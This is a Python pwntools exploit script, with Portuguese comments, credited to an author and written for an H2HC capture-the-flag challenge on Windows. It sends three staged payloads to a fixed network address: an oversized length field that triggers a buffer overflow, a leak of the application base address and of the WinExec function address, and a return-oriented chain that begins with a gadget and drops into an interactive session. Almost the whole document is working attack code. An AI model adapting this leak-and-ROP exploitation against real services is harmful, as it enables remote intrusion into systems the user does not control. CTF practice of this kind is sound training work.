#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
Aplicação H2HC criado para CTF
Exploit criado por M4v3r1ck (helvio_junior[at]hotmail[dot]com)
'''

from pwn import *
import os
 
context(arch='amd64', os='windows', log_level='debug')

host= "192.168.255.202"
port = 54345

# Estágio 1
log.info("Enviando estágio 1")
payload1  = "H2HC" #cookie 
payload1 += "\xff\x00\x00\x00" #size to trigger the vul
payload1 += "\x41" * 0xff
payload1 += "\n"

p = remote(host, port)
p.send(payload1)
p.recv(4096)
p.close()

# Estágio 2
log.info("Enviando estágio 2")
payload2  = "H2HC" 
payload2 += "\xff\x00\x00\x00" 
payload2 += "A" * 0x100
payload2 += "\x04\x09\x00\x00" 


p1 = remote(host, port)
p1.send(payload2)

p1.recvuntil("H2HC19 message:")


#Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text)
p1.recv(0x10d) 
ld1 = p1.recv(8)
leak_local_addr  = u64(ld1.ljust(8, "\x00"))

base_addr = leak_local_addr & 0xffffffffffff0000

log.info("Local leak   : %s" % hex(leak_local_addr))
log.info("App Base Addr   : %s" % hex(base_addr))

# Leak do endereço da função WinExec
p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a  fa 7f 
lead_data = p1.recv(8)
p1.recv(4096)

leak  = u64(lead_data.ljust(8, "\x00"))

log.info("WinExec addr leak   : %s" % hex(leak))
p1.close()

'''
0x000000014000464f : nop ; ret
'''


#Estágio 3 - Redirecting
payload3  = "H2HC" #cookie 
payload3 += "\x00\x01\x00\x00" #size to trigger the vul
payload3 += "A" * 0x100
payload3 += "\x01\x01\x01\x01" # Não pode ter nullbyte aqui
payload3 += "A" * (8) # padding


payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento

payload3 += "\x41" * (4) # Alinhamento
payload3 += "\x42" * (8) # Trash



p2 = remote(host, port)
p2.send(payload3)

p2.interactive()